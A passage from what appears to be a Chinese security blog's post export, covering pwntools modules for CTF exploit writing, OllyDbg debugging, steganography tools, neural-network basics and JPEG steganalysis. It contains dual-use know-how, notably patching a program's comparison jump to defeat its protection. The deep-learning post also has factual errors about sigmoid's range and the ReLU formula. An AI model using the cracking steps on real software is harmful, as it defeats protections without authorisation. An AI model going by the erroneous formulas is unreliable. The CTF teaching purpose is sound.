hex(core.pc)\n0x565cd57b\n>>> print core.libc\nf7510000-f76df000 r-xp 1cf000 /usr/lib32/libc-2.26.so\n```\n\n#### dynelf\n\n```\npwnlib.dynelf.DynELF\n```\n\n该模块是专门用来应对无 libc 情况下的漏洞利用。它首先找到 glibc 的基地址，然后使用符号表和字符串表对所有符号进行解析，直到找到我们需要的函数的符号。\n\n#### fmtstr\n\n```\npwnlib.fmtstr.FmtStr`，`pwnlib.fmtstr.fmtstr_payload\n```\n\n该模块用于格式化字符串漏洞的利用，格式化字符串漏洞是 CTF 中一种常见的题型，我们会在后面的章节中详细讲述，关于该模块的使用也会留到那儿。\n\n#### gdb\n\n```\npwnlib.gdb\n```\n\n在写漏洞利用的时候，常常需要使用 gdb 动态调试，该模块就提供了这方面的支持。\n\n两个常用函数：\n\n- `gdb.attach(target, gdbscript=None)`：在一个新终端打开 gdb 并 attach 到指定 PID 的进程，或是一个 `pwnlib.tubes` 对象。\n- `gdb.debug(args, gdbscript=None)`：在新终端中使用 gdb 加载一个二进制文件。\n\n上面两种方法都可以在开启的时候传递一个脚本到 gdb，可以很方便地做一些操作，如自动设置断点。\n\n```python\n# attach to pid 1234\ngdb.attach(1234)\n\n# attach to a process\nbash = process('bash')\ngdb.attach(bash, '''\nset follow-fork-mode child\ncontinue\n''')\nbash.sendline('whoami')\n# Create a new process, and stop it at 'main'\nio = gdb.debug('bash', '''\n# Wait until we hit the main executable's entry point\nbreak _start\ncontinue\n\n# Now set breakpoint on shared library routines\nbreak malloc\nbreak free\ncontinue\n''')\n```\n\n#### memleak\n\n```\npwnlib.memleak\n```\n\n该模块用于内存泄露的利用。可用作装饰器。它会将泄露的内存缓存起来，在漏洞利用过程中可能会用到。\n\n#### util\n\n```\npwnlib.util.packing`, `pwnlib.util.cyclic\n```\n\nutil 其实是一些模块的集合，包含了一些实用的小工具。这里主要介绍两个，packing 和 cyclic。\n\npacking 模块用于将整数打包和解包，它简化了标准库中的 `struct.pack` 和 `struct.unpack` 函数，同时增加了对任意宽度整数的支持。\n\n使用 `p32`, `p64`, `u32`, `u64` 函数分别对 32 位和 64 位整数打包和解包，也可以使用 `pack()` 自己定义长度，另外添加参数 `endian` 和 `signed` 设置端序和是否带符号。\n\n```text\n>>> p32(0xdeadbeef)\n'\\xef\\xbe\\xad\\xde'\n>>> p64(0xdeadbeef).encode('hex')\n'efbeadde00000000'\n>>> p32(0xdeadbeef, endian='big', sign='unsigned')\n'\\xde\\xad\\xbe\\xef'\n>>> u32('1234')\n875770417\n>>> u32('1234', endian='big', sign='signed')\n825373492\n>>> u32('\\xef\\xbe\\xad\\xde')\n3735928559\n```\n\ncyclic 模块在缓冲区溢出中很有用，它帮助生成模式字符串，然后查找偏移，以确定返回地址。\n\n```text\n>>> cyclic(20)\n'aaaabaaacaaadaaaeaaa'\n>>> cyclic_find(0x61616162)\n4\n```\n\n### 0x34 Pwntools 在 CTF 中的运用\n\n可以在下面的仓库中找到大量使用 pwntools 的 write-up： [pwntools-write-ups](https://github.com/Gallopsled/pwntools-write-ups)\t\n\n---------------\n\n## 0x40 OllyDbg\n\n### 0x41 OllyDbg调试器基本操作\n\n<div style=\"text-align: center;\">\n![OD界面介绍](1543165695976.png)\n</div>\n\n#### ① 加载程序\n\n1. 加载程序：OllyDbg可以用两种方式加载目标程序进行调试，一种是通过**CreateProcess创建进程**；另外一种是利用`DebugActiveProcess`函数将调试器**捆绑到一个正在运行的进程上**。 \n2.利用CreateProcess创建进程：单击菜单“File/Open”或者**按快捷键F3**打开目标文件，这样会调用`CreateProcess`创建一个用以调试的进进程。OllyDbg将接收目标进程发送的调试事件，并对相应的对调试事件进行处理。 \n4. OllyDbg除了直接加载目标程序，也支持带参数的程序，方法是：在打开对话框中的“Arguments”栏中输入参数。如下图所示：\n<div style=\"text-align: center;\">\n![1543164648498](1543164648498.png)\n</div>\n5. **将OllyDbg附加到一个正在运行的进程**：OllyDbg一个实用的功能是可以调试正在运行的程序，这个功能称为”附加（Attach）“。其原理是利用`DebugActiveProcess`函数将调试器捆绑到一个正在运行的进程上，如果执行成功，则类似利用`CreateProcess`创建新进程。\n6. 单击菜单”File/Attach“打开**附加对话框**。选择正在运行的目标进程，单击Attach按钮即可附加到目标进程。附加后，目标程序会暂停在Ntdll.dll中的DbgBreakPoint处，按下**F9或者shift+F9**就可以让程序继续运行。接着对目标程序进行调试分析。\n7. 如果进程是隐藏的，OllyDbg有一个`-p`启动参数，只要得到进程的pid就可以附加了。可以利用IceSword等工具获得隐藏进程的PID，然后在控制台下用 -p 参数附加即可。注意，**pid的值是十进制**\n8. **单步跟踪**：调试器一个最基本的功能就是动态跟踪，OllyDbg在菜单“Debug”里有控制运行的命令，各个菜单项有对应的快捷键。 \n\n| OllyDbg功能键 | 功能 |\n| ------------- |--|\n|F7 |单步步进，遇到Call跟进 |\n|F8 |单步步过，遇到CALL跳过，不跟进 |\n|Ctrl+F9 |直到出现RET指令时中断 |\n|Alt+F9 |若进入系统领空，此命令可以回到应用程序领空。|\n|F9| 运行程序|\n\n9. F8键在调试中用的很频繁，可以一句句地**单步执行**汇编指令，**遇到CALL指令不会跟进**，而是路过。而F7的差别就主要在于，遇到CALL、LOOP等指令是**会跟进去**。\n\n10. 如果是**重复多次调用F7或者F8**时，OllyDbg提供了**“Ctrl+F7”和“Ctrl+F8”**快捷键，直到按下**Esc键、F12键**或者遇到断点时停止。 \n\n11. 当**位于某个CALL**中，想回到调用这个CALL的地方时，可以按下**“Ctrl+F9”**快捷键，执行“执行到返回（Execute till return）”功能。OllyDbg就会停在**遇到的第一个返回命令**（RET、RETF或者IRET。可以设置为停在刚执行完RET等的位置）. \n\n12. 而如果**跟进系统DLL提供的API函数**中，此时想**返回到应用程序领空里**，可以按快捷键**“Alt+F9”**执行**“Execute till user code”**(执行到用户代码)命令。\n\n#### ② 设置断点\n\n1. **设置断点**：断点是调试器的一个**重要功能**，可以**让程序中断在需要的地方**，从而方便分析。最常用的断点是INT3断点，其原理是OllyDbg将断点地址处代码修改为INT3 指令。设置断点的**快捷键是F2**，**再按一次F2取消断点**；也可以用鼠标双击“Hex dump”列来设置断点。\n2. **调试分析**：字符串通常利用**Window文件框输入**。为了检查输入字符，程序通常采用下面的函数将文本框中的内容读取出来。\n\n  |字符串读取函数 | 32位（ANSI版本）  |32位（Unicode版本）|\n  |---|----|----|\n  |GetDlgItemText | GetDlgItemTextA | GetDlgItemTextW |\n  |GetWindowText | GetWindowTextA | GetWindowTextW |\n\n3. 一般情况下事先不知道程序具体会调用什么函数来取字符串，只好多试几次（经验比较重要）\n\n4. 还可以**利用输入表设置断点**。在OllyDbg中，按下**\"Ctrl+N\"**这个快捷键打开应用程序输入表，会发现应用程序调用的其他模块的导出函数，找到相应的函数后，通过Enter键即可切换到相应的代码，**接下来按F2设置断点**。 \n\n5. 另一种方法：使用**“Ctrl+G“**键打开**跟随表达式**的窗口，输入GetDlgItemTextA字符串，单击OK按钮，会来到GetDlgItemTextA函数入口处，在0x77D6AC1E处下断点.\n\n6. 在阅读代码时： \n  - 要搞清楚**各个API函数的定义**（查看相关API手册）。 \n  - API函数基本采用的是**_stdcall调用约定**，即函数入口参数按**从右到左**的顺序入栈，**由被调用者清理栈中参数，返回值放在eax中**。因此，对相关的API函数要分析其前的push指令，这些指令将参数放进堆栈以供API调用。整个过程要关注堆栈的变化。 \n  -  C代码中的子程序采用的是C调用约定，参数入口按照从右到左的顺序入栈，由调用者清理栈总参数。\n\n#### ③ 找关键比较\n\n- **找到关键比较位置**：程序在进行验证时，一般会在关键位置进行比较，如果验证通过，则程序会跳转到正确的流程；如果程序验证不通过，则会跳转到错误的流程执行，在进行破解时一般只要找到比较的关键位置，将**代码修改后然后保存**到文件中即可完成对程序的暴力破解。\n- 目前修改的是内存中的数据，为了使修改一直有效，就必须将这个变化写进磁盘文件中。 \n- **保存方法**：用鼠标**选中修改过的代码**，单击鼠标右键，执行“Copy to excutable/Selection”命令，将打开**文件编辑窗口**，单击鼠标右键，执行命令**“Save File ”**即可将修改保存到文件中。 \n- 像这种通过修改文件然后屏蔽程序某些功能或改变程序流程，使程序保护方法失效的方法称为**patch(补丁)或“爆破”**","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"Tools","slug":"Tools","permalink":"http://www.killshadow.xyz/tags/Tools/"}]},{"title":"隐写术(四)--总结","date":"2019-06-06T02:10:00.000Z","path":"2019/06/06/隐写术(四)--CTF总结/","raw":"---\ntitle: 隐写术(四)--总结\ndate: 2019-06-06 10:10:00\ncategories:\ntoc: ture\ntags:\n\t- MISC\n\t- CTF\ncomments: true\n\n---\n\n## 0x10 模型介绍\n\n> STEGA即隐写术，将信息隐藏在多种载体中，如：视频、硬盘和图像，将需要隐藏的信息通过特殊的方式嵌入到载体中，而又不损害载体原来信息的表达。旨在保护需要隐藏的信息不被他人识别。信息隐蔽技术有：1）隐写术、2）数字水印、3）隐蔽信道、4）阀下信道、5）匿名信道\n> <!-- more -->\n> **Simmons模型——囚犯问题**\n>\n> <div style=\"text-align: center;\">\n> ![Simmonns模型](8343187-8ab5199afd99ba54.png)\n> </div> \n> 假设Alice和Bob在两个不同的监狱，他们之间能通过Wendy通信，同时Wendy能获取他们交流的信息，如果Alice和Bob将想要表达的信息隐藏在交流信息中，Wendy就发现不了。\n\n> **Weber定律**\n> \n> - 德国生理学家韦伯发现同一刺激差别量必须达到一定比例，才能引起差别感觉：$\\frac{\\Delta I}{I}=k$（其中,`ΔI` 是差别阈限, `I`是刺激强度,`k` 是Weber常数）\n> - 感觉量的增加落后于物理量的增加，适用于中等强度的刺激.\n> - `ΔI` —JND (Just Noticeable Difference)\n\n> **Fechner定律**\n>\n> - 心理量是刺激量的对数函数，即当刺激弱度以几何级数增加时，感觉的强度以算术级数增加: $S=k \\log I$（其中, `S`是感觉强度, `I`是刺激强度, `k`是常数）\n- 这个定律说明了人的一切感觉，包括视觉、听觉、肤觉（含痛、痒、触、温度）、味觉、嗅觉、电击觉等等，都遵从感觉不是与对应物理量的强度成正比，而是与对应物理量的的强度的常用对数成正比的。\n\n> **Watson模型**\n> \n> - Watson提出了一个测量视觉保真度模型,估计了原图像和目标图像之间的JND值。\n> - 基本原理：根据图像块的DCT系数估计变化的感知性,然后将这些估计合并成对感知距离的单个估计。\n> - 过程：1）频率敏感性；2）亮度敏感性；3）对比度敏感性；4）合并,计算总的感知距离\n\n> **听觉感知**\n> \n> - 听觉感受到的刺激是：能量、频率。遵从Fechner定律。\n> - 掩蔽效应：频域掩蔽、时域掩蔽\n> - 频域掩蔽阈值：人耳能感知的最低频率成分的声压级。\n> - 绝对听觉阈值：安静环境中,能被人耳感知的纯音最小值。\n\n> **通信隐写模型** \n> \n> <div style=\"text-align: center;\">\n![通信系统模型](8343187-d79f1f36f5b7dc1e.png)\n</div>\n\n> **隐写术安全模型**\n<div style=\"text-align: center;\">\n![隐写术安全模型](8343187-8df884a49915ca30.png)\n</div>\n\n> **数字水印空间模型**\n> \n<div style=\"text-align: center;\">\n![数字水印空间模型](8343187-76f1f85b1b7f9566.png)\n</div>\n\n> **典型隐写模型**\n> \n> <div style=\"text-align: center;\">\n![典型隐写模型](8343187-0eca908d6392480c.png)\n</div>\n>\n> - **评价隐写术的标准核心标准**：隐蔽程度隐蔽程度越高，直接导致检测有效信息越困难\n> - 其他标准：隐写算法的好坏、隐写手段的复杂度、提取信息的难易度\n\n> **隐写术分类**\n> <div style=\"text-align: center;\">\n![隐写术分类](8343187-a87a99cab86f378d.png)\n</div>\n\n> **CTF隐写术现状**\n> <div style=\"text-align: center;\">\n![CTF隐写术现状](8343187-5a169fa1bcb3b2e6.png)\n</div>\n\n> **LSB隐写介绍**\n> \n> 一种常见的方式是利用LSB来进行隐写，LSB也就是最低有效位 (Least Significant Bit)。原理就是图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit，在人眼看来是看不出来区别的，也把信息隐藏起来了。譬如我们想把’A’隐藏进来的话，如下图，就可以把A转成16进制的0x61再转成二进制的01100001，再修改为红色通道的最低位为这些二进制串。\n> <div style=\"text-align: center;\">\n![红色通道最后一位被修改](https://upload-images.jianshu.io/upload_images/8343187-0347cec0020ba1a2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n</div>\n> <div style=\"text-align: center;\">\n![每个通道都修改最后一位，修改8次就能隐藏一个ASCII码](8343187-87f75058fdf7b8cb.jpg)\n</div>\n> 如果是要寻找这种LSB隐藏痕迹的话，Stegsolv.e是个神器，可以来辅助我们进行分析。\n> **注：jpg是有损压缩，无法LSB隐藏信息；png虽有压缩却是无损的，bmp没有被压缩，这两者都可用LSB隐藏信息。**\n\n## 0x20 工具介绍\n\n### binwalk\n> Binwalk是一个固件的分析工具，多用于逆向工程、取证、隐写分析。 [更多...](http://www.freebuf.com/sectool/15266.html)\n```bash\n$ binwalk firmware.bin  //最简单的操作\n$ binwalk --enable-plugin=zlib firmware.bin  //有些签名无法识别，利用zlib插件扫描zlib压缩包可识别\n$ binwalk -y filesystem firmware.bin  //指定字符串“filesystem”搜索(正则)，-Y 输出结果只包含文本字符串\n$ binwalk -x filename firmware.bin  //排除搜索结果中指定'filename'字符串(正则)\n$ binwalk -y filesystem -x jffs2 firmware.bin  //输出既包含'filesystem'又排除'jffs2'的字符串\n$ binwalk --dd='zip archive:zip:unzip %e' firmware.bin  //<type>:<extension>[:<command>]. type 是签名中描述的小写字符串（支持正则表达式）;extension 是将数据保存到磁盘时使用的文件扩展名;command 是当数据已保存到磁盘后可选的命令执行语句\n$ binwalk -e firmware.bin  //自动提取\n$ binwalk --extract=./my_extract.conf firmware.bin  //自定义提取规则'my_extract.conf'\n$ binwalk -Me firmware.bin  //递归提取(8层)\n$ binwalk -A firmware.bin  //扫描与功能相关联的各种框架操作码\n$ binwalk -W firmware1.bin firmware2.bin firmware3.bin  //比较, 在文件当中相同字节的是绿色显示，不同的是红色显示，蓝色表示只是有些文件当中的不同部分\n$ binwalk -S firmware.bin  //字符串搜索\n$ binwalk -E firmware.bin  //熵分析\n$ binwalk -AE firmware.bin  //签名或字符串以及熵分析\n$ binwalk --heuristic firmware.bin  //启发式扫描, 加密或压缩的高熵的数据块进行分类\n$ binwalk --list-plugins  //插件列表\n$ binwalk --enable-plugin=foo firmware.bin  //启用插件扫描\n$ binwalk --disable-plugin=foo firmware.bin  //禁用插件扫描\n$ binwalk -f binwalk.log firmware.bin  //日志记录功能\n$ sudo binwalk -u  //升级binwalk\n```\n\n### WinHex\n> Winhex是在Windows下执行的十六进制编辑软件，此软件功能很强大，有完好的分区管理功能和文件管理功能。能自己主动分析分区链和文件簇链。在CTF中一般用来查看文件头格式、直接修改16进制数据，等等。[更多...](https://blog.csdn.net/bcbobo21cn/article/details/51187699)\n\n### 010 Editor\n> 010 Editor是一款非常强大的文本/十六进制编辑器，除了文本/十六进制编辑外，还包括文件解析、计算器、文件比较等功能，但它真正的强大之处还在于文件的解析功能。我们可以使用010Editor官方网站提供的解析脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。\n\n### Stegsolve\n> Stegsolve是一款图片分析工具，具体功能如下：\n<div style=\"text-align: center;\">\n![功能](8343187-1806d57f6405edff.png)\n</div>\n\n### Stegdetect\n> stegdetect是一种数字图像隐写分析工具,主要实现JPEG图像的隐秘信息的嵌入的检测。[更多...](http://www.freev.cc/2016/09/08/ctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E7%AF%87/)\n> q – 仅显示可能包含隐藏内容的图像\n> n – 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。\n如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。\ns – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，\n算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。\nd – 打印带行号的调试信息。\nt – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：\nj – 检测图像中的信息是否是用jsteg嵌入的。\no – 检测图像中的信息是否是用outguess嵌入的。\np – 检测图像中的信息是否是用jphide嵌入的。\ni – 检测图像中的信息是否是用invisible secrets嵌入的。\n\n\n### ffmpeg\n> ffmpeg作为媒体文件处理软件，基本用法: `ffmpeg -i INPUTfile [OPTIONS] OUTPUTfile`\n输入输出文件通常就是待处理的多媒体文件了。可以是纯粹的音频文件，纯粹的视频文件，或者混合的。ffmpeg支持绝大部分的常见音频,视频格式，像常见的mpeg,AVI封装的DIVX和Xvid等等，具体的格式支持列表可以使用ffmpeg -formats查看或直接查阅文档。[更多...](http://www.ffmpeg.org/documentation.html)\n\n### MSU Stego\n> 用于对 AVI 文件进行隐写\\提取操作. 官方介绍如下： \n> MSU StegoVideo allows hiding any file in a video sequence.Different popular codecs were analyzed and an algorithm, providing the smallest data loss after compression, was chosen. Convolutional codes with Viterbi decoding are used to correct occurred errors. [更多...](http://www.compression.ru/video/stego_video/index_en.html)\n> **Main features**\n> Small video distortions after hiding info.\n> It is possible to extract info after video compression.\n> Information is protected with passcode.\n>\n> <div style=\"text-align: center;\">\n![](8343187-8a6b942040f6bbc0.png)\n</div>\n\n### QR Reader\n> 二维码扫描工具可自定义参数，可以自动识别二维码反色，自动识别电脑屏幕二维码，识别率比手机扫码高，非常强大。\n>\n> <div style=\"text-align: center;\">\n![](8343187-f3a4f19063cc473e.png)\n</div>\n\n### MP3Stego\n> 用于对 MP3 音频文件进行隐写、提取等操作。[更多...](http://www.petitcolas.net/steganography/mp3stego/)\n用法：\nencode -E [hidden_text.txt](http://www.petitcolas.net/steganography/mp3stego/hidden_text.txt) -P pass [svega.wav](http://www.petitcolas.net/steganography/mp3stego/svega.wav) [svega_stego.mp3](http://www.petitcolas.net/steganography/mp3stego/svega_stego.mp3)\ndecode -X -P pass svega_stego.mp3\n\n## 0x30 其他格式\n### 0x31 文件格式概述\n> - 文本格式：.pdf、.txt、.doc、.docx\n> - 图像格式：.png、.jpg、.bmp、.gif\n> - 音频格式：.mp3、.wma、.wav\n> - 视频格式：.mp4、.rmvb、.avi、.flv\n\n\n### 0x32 pdf文件格式\n> [更多...](https://lazymind.me/2017/10/pdf-structure/)\n> **数据类型**\n> - 对象, 一个PDF文档是由一个由基本数据类型组成的数据结构。  \n> - 文件（物理结构）, 决定对象是如何存放在一个PDF文件中的， 它们是如何被访问的，如何被更新的。这个结构是独立于对象的语义的。  \n> - 文档结构, 说明一些基本的对象类型是如何来表现PDF文档的成分的：页，字体，批注，和另外一些内容。  \n> - 内容流.一个PDF文件内容流包含一系列的指令，描述页面的外观或其他图形实体的外观和文件内容。\n> <div style=\"text-align: center;\">\n![pdf文件结构](8343187-b072928996c6da45.png)\n</div>\n> <div style=\"text-align: center;\">\n![数据流读写过程](8343187-e40d89ab964926b8.png)\n</div>\n\n\n***持续更新中...***\n","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://www.killshadow.xyz/tags/MISC/"}]},{"title":"深度学习理论基础","date":"2019-06-03T16:00:00.000Z","path":"2019/06/04/深度学习理论基础/","raw":"---\ntitle: 深度学习理论基础\ndate: 2019-6-4\ncategories:\ntoc: ture\ntags:\n\t- Deep Learning\ncomments: true\n---\n\n\n## 0x00 神经网络简介\n\n神经网络最早能追溯到上世纪40年代的MP模型，而上世纪80年代的误差反向传播算法（BP算法），神经网络得以进一步发展，研究者开始增加网络层实现非线性功能，但由于那时计算机的计算能力非常弱，其发展一度陷入了停滞。<!-- more -->直到2006年，Hinton提出深度信念网络（DBN），由于当时计算机计算能力有所提升，该算法能够提供更好的策略来训练模型，深度学习迎来新的生机。在图像识别领域，深度学习方法的引入打破了传统模式识别方法识别效能的瓶颈。2012年ImageNet比赛，冠军是基于CNN网络的模型AlexNet，而基于SVM方法的模型却夺得亚军。这场比赛的结果昭示了神经网络在图像识别领域的巨大前景，也揭开了深度图像识别新的研究方向。下面会介绍神经网络的基本结构，并概括分析现有的深度学习网络。\n\n----------\n\n\n\n## 0x10 神经网络基本概念\n\n### 0x11 神经元\n\n正如生物学中的概念，计算机科学中神经网络的神经元是最基本的构件。它的功能跟人的神经元类似，即：给定一些输入给神经元，它会产生输出。从数学的角度出发，神经元就是一个数学函数，它能根据输入结合函数的性质，计算出结果并输出。如图：\n\n<div style=\"text-align: center;\">\n![神经元示意图](1559625636601.png)\n</div>\n\n不同神经元由不同的函数构成，这些函数在术语上称为激活函数。下面会介绍几种常见的激活函数。\n\n### 0x12 激活函数\n\n#### 阶跃函数\n\n阶跃函数的定义如下：\n$$\nf(x)=\\left\\{\\begin{array}{ll}{0} & {\\text { for } x<0} \\\\ {1} & {\\text { for } x \\geq 0}\\end{array}\\right.\n\\tag{1}\n$$\n其函数图如下图:\n\n<div style=\"text-align: center;\">\n![阶跃函数](1559625749773.png)\n</div>\n\n​\t\t根据公式$(1)$可知，如果x的值大于或等于0，输出为1；否则，输出为0。由图4.2可知阶跃函数在零点是不可微的。而梯度下降法常用于神经网络反向传播模型中，其思想是多变量微分寻找极值点，所以梯度下降法不能利用阶跃函数微分，所以研究者需要找到一个能够可微的替代函数，Sigmoid函数由此产生。\n\n#### Sigmoid函数\n\nSigmoid函数定义如下：\n$$\nf(x)=\\sigma(x)=\\frac{1}{1+e^{-x}}\n\\tag{2}\n$$\n其函数图如下图：\n\n<div style=\"text-align: center;\">\n![Sigmoid函数](1559626121069.png)\n</div>\n\n​         根据公式$(2)$可知，当自变量z趋于负无穷或正无穷时，函数的值趋于-1或1。它是有界可微函数，并且在函数的每个点都有一个正导数。由于其可微性，通常被用于反向传播模型中的梯度下降法中。\n\n#### Tanh函数\n\nTanh函数定义如下：\n$$\n\\tanh x=\\frac{\\sinh x}{\\cosh x}=\\frac{e^{x}-e^{-x}}{e^{x}+e^{-x}}\n\\tag{3}\n$$\n其函数图如下图：\n\n<div style=\"text-align: center;\">\n\n![Tanh函数](1559625924986.png)\n</div>\n\n​       由公式$(3)$可知，Tanh函数其实就是Sigmoid函数因变量的取值范围从$[0,1]$变成$[-1,1]$，它是一个基本的双曲函数。如Sigmoid函数，Tanh函数是可微的、单调递增的函数。与Sigmoid函数不同的是：当输入为负数时，$\\tanh\\ x$值为负数；输入为0时，$\\tanh\\ x$值为0。所以Tanh函数常用于分类器中。\n\n#### ReLU函数\n\nReLU函数定义如下：\n$$\nf(x)=\\left\\{\\begin{array}{ll}{0} & {\\text { for } x<0} \\\\ {1} & {\\text { for } x \\geq 0}\\end{array}\\right. \\ or \\ \\mathrm{R}(x)=\\max (0, \\mathrm{x})\n\\tag{4}\n$$\n其函数图如下图：\n\n<div style=\"text-align: center;\">\n\n![ReLU函数](1559626421800.png)\n</div>\n\n​         由公式$(4)$可知，ReLU自变量小于0时因变量恒为0，大于0时自变量等于因变量。ReLU是目前研究中，使用最频繁的激活函数，它通常被用在CNN或DL（Deep Learning）中。\n\n下图显示了比较常用的激活函数：\n\n<div style=\"text-align: center;\">\n\n![激活函数表](1559626462080.png)\n</div>\n\n### 0x13 神经网络\n\n前面介绍的神经元和激活函数是神经网络的基本构建，而一个神经网络由多个神经元构成，如下图：\n\n<div style=\"text-align: center;\">\n\n![多层神经网络](1559626563175.png)\n</div>\n\n​\t\t如上图，最左边的一层为输入层（Input Layer），这一层接收来自外界的输入，并将信号传递给下一层——Layer1，随后以此传递给Layer2-4，最后到达最右边的输出层（Output Layer）。而中间的Layer1-4我们把它们成为隐藏层（Hidden Layers），其中的数据无法在神经网络训练时观测到。上图中灰色的、独立于以上各层的单元叫做偏置单元（Bias Unit），具有调整函数信号传递的作用，从数学角度考虑，它是函数的截距。如函数   ，其中的n就是当   时的截距。网络层之间的信号也可以通过权值来调整。值得注意的是，隐藏层中的每一层的激活函数都可以有所不同，而神经网络的多样性正是由于神经网络中隐藏层的激活函数、网络层的权值、层数等的多样性而产生的。\n\n## 0x20 卷积神经网络（CNN）\n\n在神经网络中，卷积神经网络（CNN）是图像识别、图像分类重要分网络之一，对象检测、人脸识别等等都有CNN的影子。计算机将输入的图像视为像素阵列，然后根据图像分辨率（$H \\times W \\times D$，其中H为高度，W为宽度，D为尺寸）生成不同的阵列图，如RGB彩色图像可生成为$6\\times6\\times3$（R，G，B各占一个尺寸）阵列或者$4\\times4\\times1$灰度图像阵列。\n\n从CNN的过程来看，每个输入的图像通过滤波、池化、全连接等的处理，最后为了将这个神经网络输出的值量化成$[0,1]$区间的概率值进行分类，引入了Softmax函数。下图是用CNN分类车辆图像的完整流程：\n\n   <div style=\"text-align: center;\">\n\n![使用多层神经网络分类车辆图像](1559626957131.png)\n</div>\n\n\n\n### 0x21 卷积层\n\n在上图中的卷积层（Convolution Layer）是从输入图像中提取特征的第一层，实际上就是图像矩阵与卷积核或滤波器的卷积，这其实是一个数学计算过程。假设有一个5x5、像素值为0，1的图像与一个3x3的滤波器矩阵卷积，步长为1，如下图：\n\n<div style=\"text-align: center;\">\n\n![图像矩阵与滤波器矩阵卷积](1559627129492.png)\n</div>\n\n​         其卷积的过程如下图（图中的步骤不连续）：\n\n<div style=\"text-align: center;\">\n\n![卷积过程1](1559627181148.png)\n![卷积过程2](1559627189653.png)\n![卷积过程3](1559627199494.png)\n</div>\n\n​         通过这一步骤，我们便可得到图像滤波后的特征，当然这只是简单的案例，真实的图像远比这种情复杂，需要考虑图像通道、图像分辨率、填充（Padding）方式、卷积核的设定等等。\n\n### 0x22 池化层\n\n池化层（也称为子采样或下采样）的作用是压缩卷积后产生的特征图的尺寸，它降低了每个特征的维度，但保留了更为重要的特征，池化层的类型可以是不同的，如：最大池化是选取特征矩阵中的最大值作为新的特征图；平均池化是取特征矩阵各个区域的平均值作为新的特征图；LP池化则通过取出特征矩阵各个区域中位数来计算特征图。如下图：\n\n<div style=\"text-align: center;\">\n\n![池化层的三种类型](1559627290843.png)\n</div>\n\n当然，池化层的类型绝不仅仅是以上三种，对于特殊用途的CNN有特殊的池化方式。\n\n### 0x23 全连接层\n\n全连接层的作用是将来自卷积层或池化层输出的二维特征图降维。跟多层感知器一样，全连接层需要激活函数计算各个单元的输出值。虽然池化层与全连接层都有降维的目的，但与池化层不同的是，全连接层致力于把二维的特征矩阵转化为特征向量，如下图：\n\n<div style=\"text-align: center;\">\n\n![全连接层的输入与输出](1559627330156.png)\n</div>\n\n----------\n\n\n\n## 0x30 本章小结\n\n​\t\t本章重点介绍了神经网络的基础概念以及在数字图像处理较为常用的卷积神经网络，为下文降维融合的方法提供理论说明。","tags":[{"name":"Deep Learning","slug":"Deep-Learning","permalink":"http://www.killshadow.xyz/tags/Deep-Learning/"}]},{"title":"隐写术(三)--JPEG隐写分析特征算法与理论","date":"2019-05-29T12:28:00.000Z","path":"2019/05/29/隐写术(三)--JPEG隐写分析特征算法与理论/","raw":"---\ntitle: 隐写术(三)--JPEG隐写分析特征算法与理论\ndate: 2019-05-29 20:28:00\ncategories:\ntoc: ture\ntags:\n\t- MISC\n\t- CTF\ncomments: true\n\n---\n\n## 0x00 前言\n\n> 前面介绍的内容着重于阐述传统的数字图像隐写算法，实际上与图像隐写对立的数字图像隐写分析，而这一方向也随着图像隐写的发展而发展，形成一种对抗的博弈。数字图像隐写分析分类如下图所示:<!-- more -->\n> <div style=\"text-align: center;\">\n![隐写分析算法分类](8343187-9cfd3b1c3aa58b1b.png) \n</div>\n\n​\t下面会介绍三个重要的隐写分析算法以展开隐写分析的研究，而这三个算法属于通用盲检测算法范畴，此类算法根据JPEG图像的像素点或者DCT系数的特性，提取出JPEG图像的共生矩和直方图特征，利用这些特征作为分类器的输入，分类器根据这些特征训练可得到检测器，以检测图片是否嵌入了秘密信息。\n\n> 若hexo解析公式不正常, [请转移到简书看](https://www.jianshu.com/p/e75b4baa93f1)\n\n-----------------------\n\n## 0x10 残差图像的离散余弦变换\n\n残差图像的离散余弦变换（DCTR）[1]是通用的盲检测算法。该算法用JPEG中的DCT基来获得残差直方图，因此特征提取只需要计算64个8x8核DCT基，利用这些卷积核与解压JPEG图像卷积得到一个二维矩阵，然后将这个二维矩阵量化、截断得到子图像，最后根据这些子图像提取出直方图特征，再将这些直方图特征通过对称性原则对其进一步压缩，融合成8000维的特征向量。DCTR较于一般的通用盲检测算法，最大的优势在于效率非常高，提取出的特征的维数也相对较低，本小节将详细解释DCTR的每个步骤。\n\n给定一个像素为 $M × N$（M,N均为8的倍数）的灰度图像，$\\mathrm{X} \\in \\mathrm{R}^{\\mathrm{M} \\times \\mathrm{N}}$, 64个$8 × 8$非抽取的DCT基定义为$B^{(k,l)}$，则有：\n$$\n\\begin{split}\n\\mathrm{U}^{(\\mathrm{k}, \\mathrm{I})}&=\\mathrm{X} \\star \\mathrm{B}^{(\\mathrm{k} 1)}\\\\\n\\,{u(\\mathrm{X})}&=\\mathrm{U}^{(\\mathrm{k}, 1)} | 0 \\leq \\mathrm{k}, 1 \\leq 7\n\\end{split}\n\\tag{1}\n$$\n\n其中，$\\mathrm{U}^{(\\mathrm{k}, 1)} \\in \\mathrm{R}^{(\\mathrm{M}-\\overline{7}) \\times(\\mathrm{N}-7)}$，“$\\star$”表示无填充卷积。为提高可读性，定义$i,j$和$k,l$为DCT模型下空域的索引，即像素点的下标，他们的取值范围为${i, j, k, l \\in[0,7]}$。经过上面这一步，我们会得到多个   的矩阵，下面我们会看到未抽样DCT的值$u(X)$是如何受$X$的单个DCT系数细微的改变而发生巨大的影响的。\n\n假设二次采样后每$8 × 